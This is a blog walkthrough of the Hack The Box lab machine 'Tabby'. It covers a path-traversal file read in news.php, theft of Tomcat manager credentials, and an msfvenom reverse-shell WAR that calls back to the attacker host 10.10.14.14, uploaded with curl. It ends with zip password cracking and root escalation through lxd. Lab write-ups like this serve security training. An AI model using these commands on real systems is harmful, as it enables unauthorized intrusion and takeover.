---
permalink: /htb_linux/
author: Rick Theeuwes

defaults:
  # _pages
  - scope:
      path: ""
      type: pages
    values:
      layout: single
      author_profile: true
toc: true
---

# Linux Hack The Box Writeup for Tabby

## Enumeration

First, we run the old trusty nmap:

```bash
sudo nmap 10.10.10.194 -p 80,8080,22 -sC -sV -oN nmap.txt
```

Before this command I ran `nmap 10.10.10.194 -p-` to get the ports 22,80 and 8080. The flag `-sC` stands for default enum-scripts, and the `-sV` flag is for the version enumeration scripts. `-oN` states that all the text-results should be saved to the file named `nmap.txt`. 

With the result:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Here we can see that this box has is running a ssh-server, a apache webserver and a tomcat instance. The versions are all latest, so there is nothing to find there. Let's take a look at the webpages.

We start at port 80, or the "normal" webpage.

![webpage](assets/images/htb/webpage.png)

It looks like a page from a hosting company. Let's fuzz it some more!

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.194/ -x html,php,txt
```

Here we use gobuster to find all the webpages on the server. The wordlist is dirb's common.txt, a good fuzzing list that isn't very long. Most pages can be found with this list. Then we state the website and last we state the file extensions it should look for.

This is the result (minus `.htaccess` pages).

```bash
/assets (Status: 301)
/favicon.ico (Status: 200)
/files (Status: 301)
/index.php (Status: 200)
/index.php (Status: 200)
/news.php (Status: 200)
/Readme.txt (Status: 200)
/server-status (Status: 403)
```

A `readme.txt` is often pretty interesting.

![readme.txt](assets/images/htb/readme.png)

Mmmmhh, bummer. No version numbers or update log. We are dealing with a `html/css` one-pager. Alright, let's look at the other pages. The only other non-default is news.php.

![new](assets/images/htb/news.png)

Okay, a page that apologises for a recent databreach, ironic. Let's take a better look at that url:

```url
http://10.10.10.194/news.php?file=statement
```

File equals statement? That looks like a arbitrary file read vulnerability to me. Let's test it with a file that everyone should be able to access:

```url
http://10.10.10.194/news.php?file=../../../../etc/passwd
```

![read](assets/images/htb/read.png)

Terrific, we can read files. I brought the request over to burp-suite for easier checking and checked whether there are any limits on the read, by checking the `news.php` file:

![burp](assets/images/htb/burp.png)

Alright, before we continue, let's see why we can read files. The php file get the GET-parameter named file. Then it puts `files/` in front of it and reads the file. Why can we read files outside of the folders files? `fopen` reads a file from a given path, without any checks or sanitation. If we back out of the folder `files` with `..` we are in the folder with `news.php`, probaly in the folder `/var/www/html` as this is the default path for Apache. So, if we keep going back we reach the system's root and we can go to any path from there. I choose to check `/etc/passwd` because this file is almost always there and readable for all users.

So we can read files without limits. Great! But we dont't really have a lot to check right now, let's check the tomcat page first.

![tomcat_main](assets/images/htb/tomcat_main.png)

Basic Tomcat installation, let's check the admin-pages.

![tomcat_login](assets/images/htb/tomcat_login.png)

Ofcourse, we need a password, and we don't have one, *yet*. We can abuse the file-read of the webpage to read the passwords of Tomcat!

It took some fuzzing, because the Tomcat config foler is not installed in the default folder, but we can read `/usr/share/tomcat9/etc/tomcat-users.xml`.

![tomcat-users](assets/images/htb/tomcat-users.png)

Alright, so now with this user we can log into Tomcat. However, looking at the roles of the user, we can only use the gui of admin. On the admin-page you can manage virtual hosts. Something we don't want or need. We need to access the manager system so we can upload a shell. We can, but not with the easy gui, we only have text-rights. This means we need to bring our shell only through a HTTP-request.

## Exploitation

First, we generate our payload, Tomcat uses war files to bring it's webpages online, so we make a war-shell using `msfvenom`

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=8090 -f war > shell.war
```

Then we start our netcat listener to catch the shell once it is uploaded:

```bash
nc -lnvp
```

Then we upload the payload to the server using our new credentials.

![postman](assets/images/htb/postman.png)

Here I am using postman to upload the .war file, but we can als use a curl command (generated by postman):

```bash
curl --location --request PUT 'http://10.10.10.194:8080/manager/text/deploy?path=/shell&update=true' \
--header 'Authorization: Basic dG9tY2F0OiQzY3VyZVA0czV3MHJkMTIzIQ==' \
--form 'file=@/home/kali/htb/tabby/shell.war'
```

Then we just navigate to `http://10.10.10.194:8080/shell` and we catch a reverse shell!

I then always use some simple steps to upgrade the shell to a proper stty, so I can use taba and Ctrl+C.

![shell](assets/images/htb/shell.png)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo
fg
enter 2x
export TERM=xterm
```

## Enumeration 2

After some searching and running [LinPeass](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) we find that there are some more interesting files in `/var/www/html/files`. A zip archive to be exact. It appears the be a back-up of some sort. After trying to extract it, it seems to be password-protected. I moved it over to my local machine and ran `fcrackzip` to find it's password.

```bash
fcrackzip --u -D -p '/usr/share/wordlists/rockyou.txt' out.zip
```

![crack](assets/images/htb/crack.png)

And the password is `admin@it`. The archive itself contains nothing of interest, but let's try the new password and the user `ash`.

![user](assets/images/htb/user.png)

## Exploitation 2

So, now let's get to root. I forgot to screenshot this, but the user ash is in the `lxd` group. Lxd is a technology similair to docker, and if you're in this group, you can spawn a root-shell. Using [this website](https://www.exploit-db.com/exploits/46978) I build the image on my local machine and transfered it to my victim. Then I executed this script, which creates the container with an unsafe flag and connects the file-systems. This way you have a root shell on the container, but you can also read files on the host. This way we get the root flag!

![root](assets/images/htb/root.png)

And thats it!